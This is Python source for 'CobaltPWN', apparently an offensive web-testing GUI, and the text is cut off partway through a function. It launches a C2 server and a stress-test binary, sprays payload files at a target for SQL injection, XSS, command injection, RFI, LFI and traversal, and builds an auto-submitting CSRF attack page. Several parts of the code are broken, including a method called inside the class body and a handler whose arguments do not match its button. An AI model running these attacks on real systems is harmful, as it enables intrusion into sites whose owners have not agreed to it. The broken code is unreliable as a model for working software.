from PyQt5.QtWidgets import QApplication, QDialog, QVBoxLayout, QHBoxLayout, QLabel, QPushButton
from PyQt5.QtGui import QPixmap, QColor, QPalette, QFont, QFontMetrics
from PyQt5.QtCore import Qt
import threading
import sys
import time
import re
import subprocess
from jinja2 import Environment, FileSystemLoader
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from datetime import datetime
import webbrowser
from time import sleep
import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
import urllib.parse
from urllib.parse import urljoin
import subprocess
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QPushButton, QTextEdit, QLabel, QWidget, QHBoxLayout, QLineEdit, QFormLayout, QMenuBar, QAction, QDialog, QDialogButtonBox
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QColor, QPalette
import os
import nmap

class SecurityTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CobaltPWN")
        self.setGeometry(200, 200, 800, 600)

        self.default_target_url = "http://localhost"
        self.default_scan_ports = "80,443"

        self.setStyleSheet("""
            QMainWindow {
                background-color: #2C2C2C;
            }
            QWidget {
                background-color: #2C2C2C;
                color: white;
            }
            QTextEdit {
                background-color: #333333;
                border: 1px solid #FF0000;
                color: white;
                padding: 10px;
                font-family: Arial, sans-serif;
            }
            QLineEdit {
                background-color: #333333;
                border: 1px solid #FF0000;
                color: white;ы
                padding: 5px;
                font-family: Arial, sans-serif;
            }
            QPushButton {
                background-color: #FF0000;
                color: white;
                border: 1px solid #FF0000;
                padding: 10px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #D00000;
            }
            QMenuBar {
                background-color: #2C2C2C;
                color: white;
            }
            QMenuBar::item:selected {
                background-color: #FF0000;
            }
            QLabel {
                color: white;
            }
            .success {
                color: #32CD32;  /* Green */
            }
            .error {
                color: #FF0000;  /* Red */
            }
            .warning {
                color: #FFD700;  /* Yellow */
            }
        """)

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.layout = QVBoxLayout()
        self.menu_bar = self.menuBar()
        self.settings_menu = self.menu_bar.addMenu("Settings")

        self.settings_action = QAction("Config", self)
        self.settings_action.triggered.connect(self.open_settings_dialog)
        self.settings_menu.addAction(self.settings_action)
        
        button_layout = QHBoxLayout()
        button_layout.setSpacing(0)  
        button_layout.setContentsMargins(0, 0, 0, 0)  

        self.run_meta_nmap_btn = QPushButton("MetaScan")
        self.run_meta_nmap_btn.clicked.connect(self.run_meta_nmap)
        self.run_meta_nmap_btn.setFixedWidth(150)  
        self.run_meta_nmap_btn.setFixedHeight(40)  
        button_layout.addWidget(self.run_meta_nmap_btn)

        self.run_stress_btn = QPushButton("Stress Test")
        self.run_stress_btn.clicked.connect(self.run_stress)
        self.run_stress_btn.setFixedWidth(150)  
        self.run_stress_btn.setFixedHeight(40)  
        button_layout.addWidget(self.run_stress_btn)

        self.run_C2_Server_btn = QPushButton("Server C2")  
        self.run_C2_Server_btn.clicked.connect(self.run_C2_Server)
        self.run_C2_Server_btn.setFixedWidth(150)  
        self.run_C2_Server_btn.setFixedHeight(40)  
        button_layout.addWidget(self.run_C2_Server_btn)

        self.run_C2_Server_btn = QPushButton("заглушка")  
        self.run_C2_Server_btn.clicked.connect(self.заглушка)
        self.run_C2_Server_btn.setFixedWidth(150)  
        self.run_C2_Server_btn.setFixedHeight(40)  
        button_layout.addWidget(self.run_C2_Server_btn)

        self.layout.addLayout(button_layout)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.layout.addWidget(self.log_area)

        self.form_layout = QFormLayout()

        self.url_input = QLineEdit(self.default_target_url)
        self.form_layout.addRow("Target URL:", self.url_input)

        self.csrf_token_input = QLineEdit()
        self.form_layout.addRow("CSRF Token:", self.csrf_token_input)

        self.username_input = QLineEdit()
        self.form_layout.addRow("Username (for auth tests):", self.username_input)

        self.password_input = QLineEdit()
        self.form_layout.addRow("Password (for auth tests):", self.password_input)

        self.layout.addLayout(self.form_layout)

        self.buttons_layout = QHBoxLayout()

        self.sql_injection_btn = QPushButton("SQL Injection Test")
        self.sql_injection_btn.clicked.connect(self.sql_injection_test)
        self.buttons_layout.addWidget(self.sql_injection_btn)

        self.xss_test_btn = QPushButton("XSS Test")
        self.xss_test_btn.clicked.connect(self.xss_test)
        self.buttons_layout.addWidget(self.xss_test_btn)

        self.csrf_test_btn = QPushButton("CSRF Test")
        self.csrf_test_btn.clicked.connect(self.csrf_test)
        self.buttons_layout.addWidget(self.csrf_test_btn)

        self.command_injection_btn = QPushButton("Command Injection Test")
        self.command_injection_btn.clicked.connect(self.command_injection_test)
        self.buttons_layout.addWidget(self.command_injection_btn)

        self.rfi_test_btn = QPushButton("Remote File Inclusion (RFI) Test")
        self.rfi_test_btn.clicked.connect(self.rfi_test)
        self.buttons_layout.addWidget(self.rfi_test_btn)

        self.lfi_test_btn = QPushButton("Local File Inclusion (LFI) Test")
        self.lfi_test_btn.clicked.connect(self.lfi_test)
        self.buttons_layout.addWidget(self.lfi_test_btn)

        self.directory_traversal_btn = QPushButton("Directory Traversal Test")
        self.directory_traversal_btn.clicked.connect(self.directory_traversal_test)
        self.buttons_layout.addWidget(self.directory_traversal_btn)

        self.security_misconfiguration_btn = QPushButton("Security Misconfiguration Test")
        self.security_misconfiguration_btn.clicked.connect(self.security_misconfiguration_test)
        self.buttons_layout.addWidget(self.security_misconfiguration_btn)

        self.broken_authentication_btn = QPushButton("Broken Authentication Test")
        self.broken_authentication_btn.clicked.connect(self.broken_authentication_test)
        self.buttons_layout.addWidget(self.broken_authentication_btn)

        self.sensitive_data_exposure_btn = QPushButton("Sensitive Data Exposure Test")
        self.sensitive_data_exposure_btn.clicked.connect(self.sensitive_data_exposure_test)
        self.buttons_layout.addWidget(self.sensitive_data_exposure_btn)

        self.xx_injection_test_btn = QPushButton("XXE Injection Test")
        self.xx_injection_test_btn.clicked.connect(self.xx_injection_test)
        self.buttons_layout.addWidget(self.xx_injection_test_btn)

        self.scan_network_btn = QPushButton("Network Scan")
        self.scan_network_btn.clicked.connect(self.scan_network)
        self.buttons_layout.addWidget(self.scan_network_btn)

        self.layout.addLayout(self.buttons_layout)
        self.central_widget.setLayout(self.layout)

    def log(self, message, message_type="info"):
        if message_type == "success":
            message = f'<p class="success">{message}</p>'
        elif message_type == "error":
            message = f'<p class="error">{message}</p>'
        elif message_type == "warning":
            message = f'<p class="warning">{message}</p>'
        else:
            message = f'<p>{message}</p>'
        self.log_area.append(message)

    def get_target_url(self):
        return self.url_input.text()

    def get_csrf_token(self):
        return self.csrf_token_input.text()

    def get_username(self):
        return self.username_input.text()

    def get_password(self):
        return self.password_input.text()

    def open_settings_dialog(self):
        dialog = SettingsDialog(self)
        dialog.exec_()

    def set_target_url(self, url):
        self.url_input.setText(url)

    def set_scan_ports(self, ports):
        self.default_scan_ports = ports  
    
    def show_info_dialog():
        app = QApplication([])
    
        if not os.path.exists("start.txt"):
            with open("start.txt", 'w') as f:
                f.write("The user has accepted the license agreement")
    
            def show_license_dialog():
                license_dialog = QDialog()
                license_dialog.setWindowTitle("LICENSE")
    
                font = QFont("Courier", 12)
                license_dialog.setFont(font)
    
                palette = QPalette()
                palette.setColor(QPalette.Background, QColor(40, 40, 40))  
                license_dialog.setPalette(palette)
                license_dialog.setStyleSheet("border: 2px solid red;")  
    
                layout = QVBoxLayout()
    
                license_text = QTextEdit("### Лицензионное соглашение / License Agreement \n --- \n #### На русском языке \n **Лицензионное соглашение для программы \"CobaltPWN\"** \n 1. **Общие положения** \n 1.1 Программа \"CobaltPWN\" является интеллектуальной собственностью её автора (далее — \"Правообладатель\"). \n 1.2 Настоящее соглашение является юридически обязательным договором между пользователем (далее — \"Пользователь\") и Правообладателем. \n 1.3 Использование программы означает полное согласие с условиями настоящего соглашения. \n 2. **Цели и использование** \n 2.1 Программа предоставляется \"как есть\" (\"as is\") без каких-либо гарантий, включая пригодность для конкретных целей или бесперебойную работу. \n 2.2 Разрешается использование программы исключительно для: \n - образовательных и исследовательских целей; \n - тестирования безопасности с письменного разрешения владельца тестируемой системы. \n 2.3 Запрещается: \n - любое использование программы в противоправных целях, включая несанкционированное тестирование или получение доступа к данным; \n - распространение вредоносного программного обеспечения на основе программы. \n 3. **Ответственность сторон** \n 3.1 Правообладатель не несёт ответственности за любой ущерб, включая прямой или косвенный, связанный с использованием программы. \n 3.2 Пользователь обязуется соблюдать законодательство своей юрисдикции при использовании программы и несёт полную ответственность за любые нарушения. \n 4. **Интеллектуальная собственность** \n 4.1 Программа и её компоненты защищены законами об авторском праве. \n 4.2 Пользователь имеет право изменять программу для личного использования, но распространение модифицированных версий возможно только с сохранением данного соглашения. \n 5. **Обновления и поддержка** \n 5.1 Правообладатель оставляет за собой право выпускать обновления программы, но не обязуется предоставлять техническую поддержку. \n 5.2 Пользователь должен самостоятельно следить за обновлениями и их установкой. \n 6. **Прекращение действия соглашения** \n 6.1 Соглашение вступает в силу с момента установки или первого использования программы. \n 6.2 Нарушение Пользователем условий соглашения ведёт к автоматическому прекращению его действия. \n 7. **Юрисдикция** \n 7.1 Настоящее соглашение разработано с учётом международного права, а также законодательства Российской Федерации и США. \n 7.2 Все споры, возникающие в связи с настоящим соглашением, разрешаются в соответствии с законами страны проживания Пользователя, если иное не согласовано сторонами. \n --- \n #### In English \n **License Agreement for \"CobaltPWN\" Software** \n 1. **General Terms** \n 1.1 The \"CobaltPWN\" software is the intellectual property of its author (hereinafter referred to as the \"Licensor\"). \n 1.2 This agreement is a legally binding contract between the user (hereinafter referred to as the \"User\") and the Licensor. \n 1.3 By using the software, the User agrees to comply with all terms of this agreement. \n 2. **Permitted Use** \n 2.1 The software is provided \"as is,\" without any guarantees, including but not limited to fitness for a particular purpose or uninterrupted operation. \n 2.2 The software may only be used for: \n - educational and research purposes; \n - security testing with explicit written permission from the system owner. \n 2.3 The following uses are strictly prohibited: \n - any illegal activity, including unauthorized testing or access to systems and data; \n - distributing malware created using the software. \n 3. **Liability** \n 3.1 The Licensor is not liable for any damages, direct or indirect, resulting from the use of the software. \n 3.2 The User is responsible for ensuring compliance with applicable laws in their jurisdiction and bears full liability for any violations. \n 4. **Intellectual Property** \n 4.1 The software and its components are protected by copyright laws. \n 4.2 The User may modify the software for personal use but must retain this agreement when distributing modified versions. \n 5. **Updates and Support** \n 5.1 The Licensor reserves the right to release updates but is not obligated to provide technical support. \n 5.2 It is the User’s responsibility to monitor and apply updates as needed. \n 6. **Termination** \n 6.1 This agreement takes effect upon installation or first use of the software. \n 6.2 Violation of the terms by the User will result in automatic termination of the agreement. \n 7. **Jurisdiction** \n 7.1 This agreement is designed to comply with international laws, including the laws of the Russian Federation and the United States. \n 7.2 Disputes arising under this agreement will be resolved under the laws of the User's jurisdiction unless otherwise agreed by the parties. \n --- \n **End of Agreement**")

                license_text.setReadOnly(True)  
                license_text.setStyleSheet("color: white; background-color: #333333; font-size: 14px;")
    
                layout.addWidget(license_text)
    
                close_button = QPushButton("EXIT")
                close_button.clicked.connect(license_dialog.accept)
                close_button.setStyleSheet("background-color: red; color: white; font-weight: bold; font-size: 14px;")
                layout.addWidget(close_button)
    
                license_dialog.setLayout(layout)
                license_dialog.exec_()
    
            main_dialog = QDialog()
            main_dialog.setWindowTitle("ADOUT")
    
            font = QFont("Courier", 16, QFont.Bold)  
            main_dialog.setFont(font)
    
            font_metrics = QFontMetrics(font)
            width = font_metrics.horizontalAdvance("VERSION: 1.0.0") + 50  
            height = font_metrics.height() * 3 + 25 
    
            def cm_to_px(cm):
                dpi = QApplication.primaryScreen().logicalDotsPerInch()
                inches = cm * 0.393701  
                return int(inches * dpi)  
    
            main_dialog.setGeometry(300, 300, cm_to_px(20), height)
    
            palette = QPalette()
            palette.setColor(QPalette.Background, QColor(40, 40, 40))  
            main_dialog.setPalette(palette)
            main_dialog.setStyleSheet("border: 2px solid red;")  
    
            layout = QHBoxLayout()
    
            pixmap = QPixmap(r"program_files\recourses\logo.png") 
            pixmap = pixmap.scaled(cm_to_px(10), cm_to_px(10), Qt.KeepAspectRatio) 
            image_label = QLabel()
            image_label.setPixmap(pixmap)
            layout.addWidget(image_label)
    
            text_widget = QWidget()
            text_layout = QVBoxLayout()
    
            label = QLabel("CobaltPWN\n\nVERSION: 1.0.0\n\nDEVELOPER: @RigOlit\n\nTG CHANNLE: @Rigolit22")
            label.setAlignment(Qt.AlignTop)
            label.setStyleSheet("color: white; font-weight: bold; font-size: 18px;")  
            text_layout.addWidget(label)
    
            license_button = QPushButton("LICENSE")
            license_button.setStyleSheet("background-color: red; color: white; font-weight: bold; font-size: 14px;")
            license_button.clicked.connect(show_license_dialog)  
            text_layout.addWidget(license_button)
    
            close_button = QPushButton("NEXT")
            close_button.setStyleSheet("background-color: red; color: white; font-weight: bold; font-size: 14px;")
            close_button.clicked.connect(main_dialog.accept)
            text_layout.addWidget(close_button)
    
            text_widget.setLayout(text_layout)
            layout.addWidget(text_widget)
    
            main_dialog.setLayout(layout)
            main_dialog.exec_()

    show_info_dialog()

    def run_stress(self):
        stress_source_path = os.path.join(os.getcwd(), 'program_files', 'stress', 'stress_test_tool.exe')
    
        if os.path.exists(stress_source_path):
            try:
                subprocess.Popen([stress_source_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.log("[SUCCESS] Stress test launched.", "success")
            except Exception as e:
                self.log(f"[ERROR] Unknown error: {e}", "error")
        else:
            self.log("[ERROR] The source file for Stress test was not found", "error")
    
    def run_meta_nmap(self):
        meta_nmap_path = os.path.join(os.getcwd(), 'program_files', 'met_map', 'meta_nmap.exe')  
        if os.path.exists(meta_nmap_path):
            try:
                subprocess.Popen([meta_nmap_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.log("[SUCCESS] MetaScan launched.", "success")
            except Exception as e:
                self.log(f"[ERROR] Unknown error: {e}", "error")
        else:
            self.log("[ERROR] No components found for MetaScan", "error")
    
    def run_C2_Server(self):
        server_c2_path = os.path.join(os.getcwd(), 'program_files', 'server', 'server_C2.exe') 
        if os.path.exists(server_c2_path):
            try:
                subprocess.Popen([server_c2_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
                self.log("[SUCCESS] C2 Server launched.", "success")
            except Exception as e:
                self.log(f"[ERROR] Unknown error: {e}", "error")
        else:
            self.log("[ERROR] No components found for C2 Server", "error")
    
    def sql_injection_test(self):
        target_url = self.get_target_url()
        payload_file = os.path.join("program_files", "payloads", "sql.txt")
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        self.log("The SQL Injection test begins...", "info")
    
        try:
            if not target_url or not target_url.startswith(("http://", "https://")):
                log("[ERROR] Invalid URL: Check the configuration.", "error")
                return
    
            if not os.path.isfile(payload_file):
                log(f"[ERROR] The uploads file was not found: {payload_file}", "error")
                return
    
            log("Loading SQL Injection uploads from a file...", "info")
            with open(payload_file, "r", encoding="utf-8") as file:
                payloads = [line.strip() for line in file if line.strip()]
    
            if not payloads:
                log("[ERROR] The uploads file is empty or incorrect.", "error")
                return
    
            log(f"Loaded {len(payloads)} payloads.", "info")
    
            def test_payload(payload):
                data = {"username": payload, "password": "password"}
                log(f"Testing the payload: {payload}", "debug")
    
                try:
                    response = requests.post(target_url, data=data, timeout=10)
                    log(f"[INFO] Response code: {response.status_code}", "info")
    
                    if response.status_code == 200 and "error" not in response.text.lower():
                        log(f"[SUCCESS] Vulnerability found! The payload: {payload}", "success")
                        return
                except requests.exceptions.Timeout:
                    log("[ERROR] The waiting time for a response from the server has been exceeded.", "error")
                except requests.exceptions.RequestException as e:
                    log(f"[ERROR] Error sending the request: {e}", "error")
                except Exception as e:
                    log(f"[ERROR] Unexpected error: {e}", "error")
    
            threads = []
            for payload in payloads:
                thread = threading.Thread(target=test_payload, args=(payload,))
                threads.append(thread)
                thread.start()
    
            for thread in threads:
                thread.join()
    
            log("[INFO] Vulnerability not found for all payloads.", "info")
    
        except Exception as e:
            log(f"[ERROR] Unexpected error: {e}", "error")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"SQL_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "SQL Injection Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()

    def xss_test(self):
        target_url = self.get_target_url()
        payload_file = os.path.join("program_files", "payloads", "xss.txt")
        log_entries = [] 
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        self.log("The XSS test begins...", "info")
    
        if not os.path.exists(payload_file):
            log(f"[ERROR] The file with payloads was not found: {payload_file}", "error")
            return
    
        try:
            with open(payload_file, "r", encoding="utf-8") as file:
                payloads = [line.strip() for line in file if line.strip()]
    
            log(f"Loaded {len(payloads)} payloads for testing.", "info")
    
            headers = {
                "User-Agent": "XSS-Test-Agent/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            }
    
            def test_payload(index, payload):
                log(f"Testing the payload {index + 1}/{len(payloads)}: {payload}", "info")
                try:
                    response = requests.get(target_url, params={"q": payload}, headers=headers, timeout=10)
                    response.raise_for_status()
    
                    if payload in response.text:
                        log(f"[SUCCESS] XSS vulnerability found with a payload: {payload}", "success")
                        return
                except requests.exceptions.Timeout:
                    log(f"[ERROR] Request timeout when testing the payload {index + 1}.", "error")
                except requests.exceptions.RequestException as e:
                    log(f"[ERROR] Error when testing the payload {index + 1}: {e}", "error")
    
            threads = []
            for index, payload in enumerate(payloads):
                thread = threading.Thread(target=test_payload, args=(index, payload))
                threads.append(thread)
                thread.start()
    
            for thread in threads:
                thread.join()
    
            log("[INFO] The XSS vulnerability was not found with any of the payloads.", "info")
    
        except Exception as e:
            log(f"[ERROR] Error when processing payloads: {e}", "error")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"XSS_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "XSS Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
    
    def csrf_test(self, http_request):
        self.log("The CSRF test begins...", "info")
    
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        try:
            lines = http_request.split('\n')
            method, path, _ = lines[0].split(' ', 2)
            url = f"https://{lines[1].split(' ')[1]}{path}"
    
            headers = {}
            body = ""
            body_start = False
    
            for line in lines[1:]:
                if body_start:
                    body += line + '\n'
                elif line == '':
                    body_start = True
                else:
                    key, value = line.split(': ', 1)
                    headers[key.lower()] = value.strip()
    
            body = body.strip()
            log(f"The URL of the goal: {url}", "debug")
            log(f"Disassembled headers: {headers}", "debug")
            log(f"Request Body: {body}", "debug")
    
            params = urllib.parse.parse_qs(body)
    
            def test_payload():
                csrf_payload = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>CSRF Attack</title>
        </head>
        <body>
            <form id="csrfForm" action="{url}" method="{method.lower()}">
            """
                for key, values in params.items():
                    for value in values:
                        csrf_payload += f'<input type="hidden" name="{key}" value="{value}">\n'
                csrf_payload += """
            </form>
            <script type="text/javascript">
                document.addEventListener('DOMContentLoaded', function() {
                    document.getElementById('csrfForm').submit();
                });
            </script>
        </body>
        </html>
        """
                log("A CSRF HTML payload has been generated.", "debug")
    
                data = urllib.parse.parse_qs(body)
                try:
                    response = requests.request(method, url, headers=headers, data=data, timeout=10)
    
                    if response.status_code == 200 and "error" not in response.text.lower():
                        log("[SUCCESS] CSRF vulnerability found!", "success")
                    else:
                        log("[INFO] CSRF vulnerability not found.", "info")
                except requests.exceptions.Timeout:
                    log("[ERROR] Request timeout exceeded.", "error")
                except Exception as e:
                    log(f"[ERROR] {e}", "error")
    
            thread = threading.Thread(target=test_payload)
            thread.start()
            thread.join()  
    
        except Exception as e:
            log(f"[ERROR] {e}", "error")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"CSRF_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "CSRF Injection Test Report")
            c.drawString(50, 735, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 720, f"Target URL: {url}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50: 
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()

    def command_injection_test(self):
        target_url = self.get_target_url()
        payload_file_path = "program_files/payloads/inj.txt"
        
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        try:
            with open(payload_file_path, "r") as f:
                payloads = [line.strip() for line in f.readlines() if line.strip()]
        
        except FileNotFoundError:
            log(f"[ERROR] The file '{payload_file_path}' was not found.", "error")
            return
        except Exception as e:
            log(f"[ERROR] The file could not be read '{payload_file_path}': {str(e)}", "error")
            return
    
        log("The Command Injection test begins using the uploads from the file...", "info")
        
        def test_payload(payload_str):
            payload = {"command": payload_str}
            try:
                response = requests.get(target_url, params=payload, timeout=10)
                response.raise_for_status()
    
                if "bin" in response.text:
                    log(f"[SUCCESS] Command Injection vulnerability found with a payload: '{payload_str}'", "success")
                    log(f"The result of the command: {response.text[:500]}", "info")
                    return
                else:
                    log(f"[INFO] Command Injection vulnerability not found for the payload: '{payload_str}'", "info")
    
            except Timeout:
                log(f"[ERROR] Request timeout when testing the payload: '{payload_str}'.", "error")
        
            except ConnectionError:
                log(f"[ERROR] Connection error when testing the payload: '{payload_str}'.", "error")
        
            except RequestException as e:
                log(f"[ERROR] The problem with the request for the payload '{payload_str}': {str(e)}", "error")
        
            except Exception as e:
                log(f"[ERROR] An unhandled error when testing the payload '{payload_str}': {str(e)}", "error")
    
        threads = []
        for payload_str in payloads:
            thread = threading.Thread(target=test_payload, args=(payload_str,))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        log("[INFO] The Command Injection test is completed for all payloads.", "info")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"Command_Injection_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "Command Injection Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
        
    def rfi_test(self):
        payloads_file = os.path.join('program_files', 'payloads', 'rfi.txt')
        log_entries = [] 
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        try:
            with open(payloads_file, 'r') as file:
                payloads = file.readlines()
            payloads = [payload.strip() for payload in payloads]
        except FileNotFoundError:
            log(f"[ERROR] The {payloads_file} file was not found!", "error")
            return
        except Exception as e:
            log(f"[ERROR] Error when reading a file with payloads: {e}", "error")
            return
    
        target_url = self.get_target_url()
        log("The Remote File Inclusion test begins...", "info")
    
        retries = 3  
        timeout = 10  
    
        def test_payload(payload):
            for attempt in range(retries):
                try:
                    start_time = time.time()
                    params = {"file": payload}
                    response = requests.get(target_url, params=params, timeout=timeout)
                    elapsed_time = time.time() - start_time
    
                    if response.status_code == 200:
                        log(f"[INFO] The request was completed successfully in {elapsed_time:.2f} seconds with a payload: {payload}", "info")
                        if "malicious" in response.text:
                            log(f"[SUCCESS] RFI vulnerability found with a payload: {payload}", "success")
                        else:
                            log(f"[INFO] RFI vulnerability not found with the payload: {payload}.", "info")
                    else:
                        log(f"[ERROR] Response error. Status: {response.status_code} for the payload: {payload}", "error")
                    break  
                except requests.exceptions.Timeout:
                    log(f"[WARNING] Attempt request timeout {attempt + 1} with a payload: {payload}.", "warning")
                except requests.exceptions.RequestException as e:
                    log(f"[ERROR] Network error: {e} on an attempt {attempt + 1} with a payload: {payload}.", "error")
                if attempt < retries - 1:
                    log(f"[INFO] Retry ({attempt + 2}/{retries}) with a payload: {payload}...", "info")
    
        threads = []
        for payload in payloads:
            thread = threading.Thread(target=test_payload, args=(payload,))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        log("[INFO] The Remote File Inclusion test is completed for all payloads.", "info")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"RFI_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "Remote File Inclusion Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
       
    
    def lfi_test(self, retries=3, timeout=10, payload_file="program_files/payloads/lfi.txt"):
        target_url = self.get_target_url()
        log_entries = [] 
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        if not os.path.isfile(payload_file):
            log(f"[ERROR] The file with the payloads was not found: {payload_file}", "error")
            return False
    
        with open(payload_file, "r") as f:
            payloads = [line.strip() for line in f.readlines()]
    
        log("[INFO] The Local File Inclusion test begins...", "info")
    
        def test_payload(payload):
            attempt = 0
            for _ in range(retries):
                try:
                    attempt += 1
                    log(f"[INFO] Attempt {attempt} from {retries} with a payload: {payload}", "info")
    
                    response = requests.get(target_url, params={"file": payload}, timeout=timeout)
                    if response.status_code == 200:
                        if "root" in response.text:
                            log(f"[SUCCESS] LFI vulnerability found with a payload: {payload}", "success")
                            return True
                        else:
                            log(f"[INFO] The {payload} payload did not lead to a vulnerability.", "info")
                    else:
                        log(f"[WARNING] Invalid response code for the payload {payload}: {response.status_code}", "warning")
                        return False
                except requests.exceptions.Timeout:
                    log(f"[ERROR] The timeout expired while trying {attempt} with a payload {payload}", "error")
                except requests.exceptions.RequestException as e:
                    log(f"[ERROR]Request error: {e} when trying to {attempt} with the payload {payload}", "error")
    
                sleep(2)
    
            log(f"[ERROR] The maximum number of attempts for the {payload} payload has been exhausted", "error")
            return False
    
        threads = []
        for payload in payloads:
            thread = threading.Thread(target=test_payload, args=(payload,))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        log("[INFO] The Local File Inclusion test is completed for all payloads.", "info")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"LFI_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "LFI Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
        return False
    
    def directory_traversal_test(self):
        target_url = self.get_target_url()
        payloads_file_path = os.path.join("program_files", "payloads", "dt.txt")
        
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        try:
            with open(payloads_file_path, "r", encoding="utf-8") as file:
                payloads = file.readlines()
        except FileNotFoundError:
            log("[ERROR] The file with the uploads was not found!", "error")
            return
        except Exception as e:
